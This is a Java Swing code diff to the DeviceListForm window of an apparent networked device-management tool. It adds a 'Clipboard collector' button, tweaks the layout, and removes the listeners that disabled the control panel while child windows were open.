@@ -40,8 +40,6 @@ import javax.swing.border.TitledBorder;
 import controller.Events;
 import controller.receive.DeviceRegisteredReceiver;
 import model.Device;
-import java.awt.event.WindowAdapter;
-import java.awt.event.WindowEvent;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -93,7 +91,7 @@ public class DeviceListForm extends JFrame {
 		control = new JPanel();
 		control.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Control", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 0, 0)));
 		contentPane.add(control, BorderLayout.NORTH);
-		control.setLayout(new GridLayout(0, 4, 0, 0));
+		control.setLayout(new GridLayout(0, 4, 15, 5));
 		
 		JButton btnSendFile = new JButton("Send file");
 		btnSendFile.addActionListener(new ActionListener() {
@@ -127,6 +125,14 @@ public class DeviceListForm extends JFrame {
 		});
 		control.add(btnProcessManager);
 		
+		JButton btnClipboardCollector = new JButton("Clipboard collector");
+		btnClipboardCollector.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				clipboardDetectBtnEvent();
+			}
+		});
+		control.add(btnClipboardCollector);
+		
 		JLabel label = new JLabel("");
 		control.add(label);
 		
@@ -135,9 +141,6 @@ public class DeviceListForm extends JFrame {
 		
 		JLabel label_2 = new JLabel("");
 		control.add(label_2);
-		
-		JLabel label_3 = new JLabel("");
-		control.add(label_3);
 		
 		lblAmount = new JLabel("Amount: 0");
 		lblAmount.setFont(new Font("Tahoma", Font.BOLD, 13));
@@ -292,14 +295,7 @@ public class DeviceListForm extends JFrame {
 			return;
 		}
 		JFrame temp=new SendFileForm(selectedDevices);
-		temp.addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosed(WindowEvent e) {
-				control.setEnabled(true);
-			}
-		});
 		temp.setVisible(true);
-		control.setEnabled(false);
 	}
 	
 	/**
@@ -311,14 +307,7 @@ public class DeviceListForm extends JFrame {
 			return;
 		}
 		JFrame temp=new ShutDownForm(selectedDevices);
-		temp.addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosed(WindowEvent e) {
-				control.setEnabled(true);
-			}
-		});
 		temp.setVisible(true);
-		control.setEnabled(false);
 	}
 	
 	/**
@@ -326,14 +315,7 @@ public class DeviceListForm extends JFrame {
 	 */
 	private void usbDetectBtnEvent() {
 		JFrame temp=new USBDetectForm(DeviceRegisteredReceiver.sockets);
-		temp.addWindowListener(new WindowAdapter() {
-			@Override
-			public void windowClosed(WindowEvent e) {
-				control.setEnabled(true);
-			}
-		});
 		temp.setVisible(true);
-		control.setEnabled(false);
 	}
 	
 	/**
@@ -341,13 +323,21 @@ public class DeviceListForm extends JFrame {
 	 */
 	private void processManagerBtnEvent() {
 		JFrame temp=new ProcessManagerForm(DeviceRegisteredReceiver.sockets);
-		temp.addWindowListener(new WindowAdapter() {
+		/*temp.addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosed(WindowEvent e) {
 				control.setEnabled(true);
 			}
-		});
+		});*/
 		temp.setVisible(true);
-		control.setEnabled(false);
+		//control.setEnabled(false);
+	}
+	
+	/**
+	 * ClipboardCollect.
+	 */
+	private void clipboardDetectBtnEvent() {
+		JFrame temp=new ClipboardCollectForm(DeviceRegisteredReceiver.sockets);
+		temp.setVisible(true);
 	}
 }
